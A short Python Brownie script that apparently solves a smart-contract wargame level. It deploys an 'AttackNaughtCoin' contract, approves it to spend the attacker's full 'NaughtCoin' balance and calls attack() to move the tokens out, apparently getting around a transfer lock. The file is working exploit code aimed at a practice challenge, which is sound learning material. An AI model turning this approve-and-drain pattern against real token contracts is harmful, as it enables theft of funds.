#!/usr/bin/python3
from brownie import NaughtCoin, AttackNaughtCoin
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account, convert
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def forceEntry(contract_address=None, attacker=None):
    if not contract_address:
        naught_coin, owner = deploy()
        contract_address = naught_coin.address
        attacker = owner
    else:
        naught_coin = NaughtCoin.at(contract_address)

    attack_contract = AttackNaughtCoin.deploy(naught_coin, {"from": attacker})
    hacker_balance = naught_coin.balanceOf(attacker)

    print(f"{green}Balance of the attacker: {red}{hacker_balance}{reset}")

    naught_coin.approve(attack_contract, hacker_balance, {"from": attacker})

    attack_contract.attack(attacker, {"from": attacker})
    print(
        f"{green}Balance of the attacker: {red}{naught_coin.balanceOf(attacker)}{reset}"
    )


def main(contract_address=None, attacker=None):
    if contract_address:
        forceEntry(contract_address, get_account())
    else:
        forceEntry()


if __name__ == "__main__":
    main()
